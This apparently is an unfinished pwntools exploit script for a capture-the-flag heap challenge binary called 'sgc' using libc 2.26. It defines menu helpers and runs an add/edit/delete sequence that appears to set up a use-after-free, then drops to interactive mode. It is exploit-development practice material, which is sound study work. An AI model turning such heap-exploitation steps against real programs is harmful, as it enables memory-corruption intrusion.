#!/usr/bin/env python3
from pwn import context,ELF,process,log
from fastpwn import pack, aslr
if aslr.read():
    aslr.write("2")
    log.warning("ASLR turned on")
context(arch='amd64',os='linux')
binary=ELF('./sgc',checksec=False)
p=binary.process()
libc=ELF('./libc-2.26.so',checksec=False)
## establish helper functions
def add(n,g,a):
    p.recvuntil("Action:")
    p.sendline("0")
    p.recvuntil("name:")
    p.sendline(str(n)) # name
    p.recvuntil("group:")
    p.sendline(str(g)) # group name
    p.recvuntil("age:")
    p.sendline(str(a))  # age
def gdis(n):
    p.recvuntil("Action:")
    p.sendline("1")
    p.recvuntil("name:")
    p.sendline(str(n)) # name
def udis(i):
    p.recvuntil("Action:")
    p.sendline("2")
    p.recvuntil("index:")
    p.sendline(str(i)) # index
def edit(i, n, prop=True):
    if prop: # propigate
        p.recvuntil("Action:")
        p.sendline("3")
        p.recvuntil("index:")
        p.sendline(str(i))  # index
        p.recvuntil("(y/n):")
        p.sendline("y")
        p.recvuntil("name:")
        p.sendline(str(n)) # name
    else:
        p.recvuntil("Action:")
        p.sendline("3")
        p.recvuntil("index:")
        p.sendline(str(i))  # index
        p.recvuntil("(y/n):")
        p.sendline("n")
        p.recvuntil("name:")
        p.sendline(str(n)) # name
def delete(i):
    p.recvuntil("Action:")
    p.sendline("4")
    p.recvuntil("index:")
    p.sendline(str(i))  # index
add("a","a",1)
add("b","b",1)
edit("a","b")
delete(1)



p.interactive()
